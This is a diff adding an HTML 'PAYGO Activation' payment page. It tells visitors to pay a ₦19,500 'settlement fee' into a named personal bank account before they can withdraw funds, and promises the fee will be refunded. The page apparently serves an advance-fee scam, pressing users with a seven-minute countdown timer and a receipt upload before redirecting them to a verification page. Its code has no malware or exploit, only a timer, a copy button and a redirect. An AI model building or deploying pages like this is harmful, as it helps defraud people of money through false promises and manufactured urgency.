@@ -1,0 +1,151 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Payment Completion - PAYGO Activation</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #F3F4F6; 
+      --card: #FFFFFF; 
+      --text: #111827; 
+      --muted: #6B7280;
+      --shadow: 0 10px 30px rgba(0,0,0,0.08); 
+      --primary: #111827; 
+      --accent: #FFA500; 
+      --danger: #EF4444;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; margin: 0; background: var(--bg); color: var(--text); font-family: 'Inter', system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial, sans-serif; }
+    .container { max-width: 960px; margin: 0 auto; padding: 20px; }
+    .top { display: flex; align-items: center; gap: 10px; background: #fff; border-radius: 12px; box-shadow: var(--shadow); padding: 12px 16px; }
+    .top svg { width: 22px; height: 22px; color: #7C3AED; flex-shrink: 0; }
+    .top-title { font-weight: 700; font-size: 16px; color: #000; margin: 0 auto; text-align: center; }
+    .spacer { height: 2cm; }
+    .card { background: var(--card); border-radius: 16px; box-shadow: var(--shadow); padding: 18px; }
+    .section-title { font-weight: 700; font-size: 18px; margin: 0 0 8px; color: #000; }
+    .sub { color: var(--muted); font-size: 14px; margin: 6px 0 0; }
+    .row { display: flex; align-items: center; gap: 10px; margin-top: 10px; }
+    .timer { display: inline-flex; align-items: center; gap: 8px; font-weight: 700; color: var(--accent); font-size: 16px; }
+    .grid { display: grid; gap: 12px; }
+    .item { display: grid; grid-template-columns: auto 1fr auto; align-items: center; gap: 10px; background: #fff; border: 1px solid #E5E7EB; border-radius: 12px; padding: 12px; }
+    .item-icon { font-size: 18px; }
+    .label { font-weight: 600; font-size: 14px; color: #000; }
+    .value { font-size: 14px; color: var(--text); }
+    .copy-btn { border: none; background: #F3F4F6; color: #111; border-radius: 8px; padding: 6px 10px; cursor: pointer; font-weight: 600; }
+    .upload { margin-top: 14px; background: #fff; border: 1px solid #E5E7EB; border-radius: 12px; padding: 12px; display: grid; gap: 8px; }
+    .confirm { margin-top: 16px; width: 100%; border: none; border-radius: 999px; padding: 14px 16px; background: var(--danger); color: #000; font-weight: 700; font-size: 15px; cursor: pointer; transition: transform 120ms ease; }
+    .confirm:active { transform: scale(0.98); }
+    .notice { font-size: 12px; color: var(--muted); text-align: center; margin-top: 8px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="top">
+      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+        <path d="M3 7.5A2.5 2.5 0 0 1 5.5 5h11A2.5 2.5 0 0 1 19 7.5v9A2.5 2.5 0 0 1 16.5 19h-11A2.5 2.5 0 0 1 3 16.5v-9Z" stroke="currentColor" stroke-width="1.5" />
+        <path d="M19 10h1.5A1.5 1.5 0 0 1 22 11.5v3A1.5 1.5 0 0 1 20.5 16H19" stroke="currentColor" stroke-width="1.5" />
+        <circle cx="7.5" cy="9.5" r="1" fill="currentColor" />
+      </svg>
+      <div class="top-title">PAYGO ACTIVATION</div>
+    </div>
+
+    <div class="spacer"></div>
+
+    <section class="card" aria-label="Payment Information">
+      <h2 class="section-title">Complete Your Payment</h2>
+      <p>Make a payment of ₦19,500 to activate your account.</p>
+      <p class="sub">A settlement fee of NGN 19,500 is required to authorize withdrawals. This fee will be credited back with your withdrawal once authorized.</p>
+      <div class="row">
+        <span class="timer">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.5" />
+            <path d="M12 7v6l4 2" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" />
+          </svg>
+          <span id="countdown">07:00</span>
+        </span>
+      </div>
+    </section>
+
+    <section class="card" style="margin-top:12px" aria-label="Payment Details">
+      <h3 class="section-title">Payment Details</h3>
+      <div class="grid">
+        <div class="item">
+          <span class="item-icon">👤</span>
+          <div>
+            <div class="label">Recipient</div>
+            <div class="value">IMAMU IMAMU</div>
+          </div>
+          <span></span>
+        </div>
+        <div class="item">
+          <span class="item-icon">💳</span>
+          <div>
+            <div class="label">Account Number</div>
+            <div class="value" id="acct">6408520464</div>
+          </div>
+          <button class="copy-btn" type="button" id="copy">Copy</button>
+        </div>
+        <div class="item">
+          <span class="item-icon">🏦</span>
+          <div>
+            <div class="label">Bank</div>
+            <div class="value">MONIEPOINT MFB</div>
+          </div>
+          <span></span>
+        </div>
+        <div class="item">
+          <span class="item-icon">💰</span>
+          <div>
+            <div class="label">Amount</div>
+            <div class="value">₦19,500</div>
+          </div>
+          <span></span>
+        </div>
+      </div>
+
+      <div class="upload" aria-label="Upload Receipt">
+        <label for="receipt" class="label">Upload Payment Receipt</label>
+        <input id="receipt" type="file" accept="image/*,.pdf">
+      </div>
+
+      <button class="confirm" type="button">I have made the payment</button>
+      <div class="notice">Ensure your payment is completed before the timer runs out.</div>
+    </section>
+  </div>
+
+  <script>
+    // countdown from 7 minutes
+    const display = document.getElementById('countdown');
+    let remaining = 7 * 60;
+    const tick = () => {
+      const m = String(Math.floor(remaining / 60)).padStart(2, '0');
+      const s = String(remaining % 60).padStart(2, '0');
+      display.textContent = `${m}:${s}`;
+      if (remaining > 0) remaining--;
+    };
+    tick();
+    const timer = setInterval(tick, 1000);
+
+    // copy account number
+    document.getElementById('copy')?.addEventListener('click', async () => {
+      const text = document.getElementById('acct').textContent.trim();
+      try {
+        await navigator.clipboard.writeText(text);
+        const btn = document.getElementById('copy');
+        const old = btn.textContent;
+        btn.textContent = 'Copied';
+        setTimeout(() => (btn.textContent = old), 1200);
+      } catch (e) {
+        alert('Copy failed. Please copy manually: ' + text);
+      }
+    });
+
+    // redirect to verification page immediately on confirm
+    document.querySelector('.confirm')?.addEventListener('click', () => {
+      window.location.href = 'verification.html';
+    });
+  </script>
+</body>
+</html>
